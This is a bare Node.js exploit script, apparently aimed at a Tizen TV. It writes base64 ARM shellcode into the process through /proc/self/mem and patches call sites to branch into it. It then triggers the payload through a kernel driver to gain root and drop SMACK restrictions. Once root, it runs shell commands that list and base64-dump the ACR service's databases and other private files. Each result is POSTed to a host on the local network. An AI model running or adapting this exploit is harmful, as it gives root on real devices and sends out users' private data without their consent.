"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

var TRAMP_B64 = "8E8t6RDQTeIAEI3lBCCN5Zxgn+UAAJblAABQ4xIAABoAAKDjAhqg4wcgoOMiMKDjAEDg4wBQoOPAcKDjAAAA7wAAUOMXAAC6CACN5WQAn+UBGqDjByCg431woOMAAADvCACd5Uhgn+UAAIblABCd5QQgneUAMIDiAUCg4QJQoOEAAFXjBAAACgRwlOQEcIPkBFBF4gAAVeP6///KAACW5TD/L+H////qAQCg4xDQjeLwj73o4O+bAADgmwA=";
var STAGE2_B64 = "8E8t6QDAoOHPcKDjAACg40zQTeIAEKDhACCg4QAwoOEAQKDhAFCg4QAAAO8BAFDhPgAACgEQoOMAGIzlwBKf5QK7jOIcEI3lAuCg4a8WQeIEKIzl9hxB4iAQjeWkEp/lHACN4ggojOUFcKDjJBCN5QIQoOMMKIzlAAAA7wBgUOIKMKCzADiMtQhojLUnAAC6AqCg4QIxoOMDBKDjzRWg40AwjeVqNYPi+APN4UQwjeU4MI3iKCCN5SwgjeUAMI3lBCCN5QAwneUAkJPlBDCT5QgwjeXeNIrjrTiD4xQwjeUIMJ3lAwBZ4RQAADoAMJ3lAQBa4wgwg+IAMI3lDQAAGgAQoOMGAKDhASCg4QEwoOEBQKDhAVCg4QZwoOMAAADvAjCg4wA4jOUEMJ3lBDiM5UzQjeLwj73oAaCg4+D//+oIMJ3lBgCg4bwRn+UoII3iCYBD4DCQjeUBBljjADCg4wyQi+UDQKDhAYagIwNQoOE0gI3lNnCg4wAAAO8AMFDiEDCN5QUAAAoLMKDjADCL5RQwneUIMIvlAZaJ4s///+oIEKDhBkCg4QMgoOMBMKDjwHCg4wAAAO8BCnDjADCg4SghoJEMII2VDDCggwAwi4UQEJ2VCACLhe7//4oMQJ3lCSCB4gIAVOEHAACKACCg4wgQoOECMKDhAkCg4QJQoOFbcKDjAAAA7+L//+oAIJPlARCB4gEgQuIBClLjNgAAKgQgg+IQII3lBCCT5YlDAeMEAFLhMAAAGgggg+IQII3lCCCT5WQAUuMrAAAaDCCT5QQAUuEoAAAaECCT5WQAUuMlAAAaFCCD4hAgjeUUIJPlBABS4SAAABoYIIPiECCN5Rggk+VkAFLjGwAAGhxAk+UcIIPiECCN5QQgoOGJQwHjBABS4RQAABogIJPlZABS4xEAABoE4IPlCiCg4wjgg+UM4IPlEOCD5RTgg+UY4IPlHOCD5SDgg+Uk4IPlAEDg4wJBg+cBIILiFABS4/r//xoEIJ3lASCC4gQgjeUEMIPitf//6i9kZXZzeXMAAXMBDA==";
var SITE_A = 0x7aef1c;
var SITE_B = 0x7af2d0;
var ORIG_A = [0xe6, 0xb3, 0xe9, 0xeb];
var ORIG_B = [0xf9, 0xb2, 0xe9, 0xeb];
var TRAMP_ADDR = 0x9bed50;
var TAILPTR = 0x9befe0;
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}

function buf4(bytes) {
    var b = new Buffer(4);
    for (var i = 0; i < 4; i++) b[i] = bytes[i];
    return b;
}

function blWord(site, target) {
    var off = (target - (site + 8)) >> 2;
    var w = new Buffer(4);
    w[0] = off & 0xff;
    w[1] = (off >> 8) & 0xff;
    w[2] = (off >> 16) & 0xff;
    w[3] = 0xeb;
    return w;
}

var out = {};
out.started = new Date().toISOString();
out.uid_before = process.getuid();

var mem = fs.openSync("/proc/self/mem", "r+");
function readMem(addr, len) { var b = new Buffer(len); fs.readSync(mem, b, 0, len, addr); return b; }
function writeMem(addr, buf) { fs.writeSync(mem, buf, 0, buf.length, addr); }
function eq(a, b) { for (var i = 0; i < b.length; i++) { if (a[i] !== b[i]) return false; } return true; }

function restore() {
    try { writeMem(SITE_A, buf4(ORIG_A)); writeMem(SITE_B, buf4(ORIG_B)); out.restored = true; }
    catch (e) { out.restored = "ERR " + e.message; }
}

try {
    var maps = fs.readFileSync("/proc/self/maps", "utf8");
    out.node_text_ok = maps.indexOf("00010000-009bf000 r-xp 00000000") >= 0;
    out.site_a_ok = eq(readMem(SITE_A, 4), ORIG_A);
    out.site_b_ok = eq(readMem(SITE_B, 4), ORIG_B);
    var tail = readMem(TRAMP_ADDR, 16);
    out.tail_zero = true;
    for (var i = 0; i < tail.length; i++) { if (tail[i] !== 0) { out.tail_zero = false; break; } }
    try {
        var nfd = fs.openSync("/dev/ntksys", "r+");
        out.ntksys = "ok fd=" + nfd;
        fs.closeSync(nfd);
    } catch (e) { out.ntksys = "ERR " + e.message; }
    post("/g24_diag", out);

    if (!out.site_a_ok || !out.site_b_ok || !out.tail_zero) throw new Error("verify failed");

    var trampBuf = new Buffer(TRAMP_B64, "base64");
    var stage2Buf = new Buffer(STAGE2_B64, "base64");
    writeMem(TRAMP_ADDR, trampBuf);
    out.tramp_written = eq(readMem(TRAMP_ADDR, 4), trampBuf.slice(0, 4));

    var wa = blWord(SITE_A, TRAMP_ADDR);
    var wb = blWord(SITE_B, TRAMP_ADDR);
    writeMem(SITE_A, wa);
    writeMem(SITE_B, wb);
    out.patched = eq(readMem(SITE_A, 4), wa) && eq(readMem(SITE_B, 4), wb);
    post("/g24_patched", out);

    var devnull = fs.openSync("/dev/null", "w");
    var t0 = Date.now();
    out.trigger_ret = fs.writeSync(devnull, stage2Buf, 0, stage2Buf.length, 0);
    out.scan_ms = Date.now() - t0;

    restore();

    out.uid_after = process.getuid();
    var pagePtr = readMem(TAILPTR, 4).readUInt32LE(0);
    out.stage2_page = "0x" + pagePtr.toString(16);
    if (pagePtr) {
        var st = readMem(pagePtr + 0x800, 16);
        out.st_phase = st.readUInt32LE(0);
        out.st_hits = st.readUInt32LE(4);
        out.st_ioctl = "0x" + st.readUInt32LE(8).toString(16);
        out.st_lastphys = "0x" + st.readUInt32LE(12).toString(16);
    }

    if (out.uid_after === 0) {
        try { fs.writeFileSync("/proc/self/attr/current", "*"); out.smack_star = "set"; }
        catch (e) { out.smack_star = "ERR " + e.message; }
        try { out.id = cp.execSync("id 2>&1").toString(); } catch (e) { out.id = "ERR"; }
        try { out.caps = cp.execSync("grep -i cap /proc/self/status 2>&1").toString(); } catch (e) {}
        try {
            out.acr_ls = cp.execSync("ls -laR /opt/usr/home/owner/apps_rw/org.tizen.acr-service-app/ 2>&1 | head -60").toString();
        } catch (e) { out.acr_ls = "ERR " + e.message; }
        try {
            out.root_proof = cp.execSync("ls -la /root/ 2>&1 | head -8; echo ===; ls -la /opt/dbspace/ 2>&1 | grep -i acr | head; echo ===; ls -la /opt/usr/home/owner/apps_rw/org.tizen.acr-service-app/data 2>&1 | head -20").toString();
        } catch (e) { out.root_proof = "ERR"; }
        try {
            out.acr_files = cp.execSync("for f in $(find /opt/usr/home/owner/apps_rw/org.tizen.acr-service-app -type f -name '*.db' 2>/dev/null | head -3); do echo FILE:$f; base64 $f | head -c 4000; echo; done 2>&1").toString();
        } catch (e) { out.acr_files = "ERR"; }
        try {
            out.privdump = cp.execSync("ls -la /opt/usr/home/owner/data/ 2>&1 | head -10; echo ===; cat /opt/etc/samba/smb.conf 2>/dev/null | head -3; echo ===; ls /opt/usr/apps_rw 2>&1 | head -5").toString();
        } catch (e) { out.privdump = "ERR"; }
    }
    out.success = out.uid_after === 0;
    post("/g24_result", out);
} catch (e) {
    try { restore(); } catch (e2) {}
    out.error = "" + (e && e.stack ? e.stack : e);
    out.uid_after = process.getuid();
    post("/g24_error", out);
}
